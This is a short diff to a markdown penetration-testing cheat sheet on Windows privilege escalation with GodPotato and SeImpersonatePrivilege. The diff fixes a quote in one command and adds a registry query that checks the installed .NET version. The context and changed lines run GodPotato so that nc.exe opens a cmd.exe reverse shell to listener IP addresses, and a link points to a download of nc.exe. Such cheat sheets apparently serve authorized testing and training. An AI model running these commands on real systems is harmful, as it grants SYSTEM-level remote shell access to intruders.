@@ -607,10 +607,16 @@ GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
 ```
 
 ```
-.\GodPotato-NET4.exe -cmd "C:\Users\Public\nc.exe -e cmd.exe 10.130.85.61 1234
+.\GodPotato-NET4.exe -cmd "C:\Users\Public\nc.exe -e cmd.exe 10.130.85.61 1234"
 ```
 
 Donwload nc.exe from https://github.com/int0x33/nc.exe/blob/master/nc.exe?source=post_page-----10b91a94c580---------------------------------------
+
+## Learn installed dotnet version
+
+```
+reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
+```
 
 ##  SeImpersonatePrivilege Exploit Cheat Sheet
 
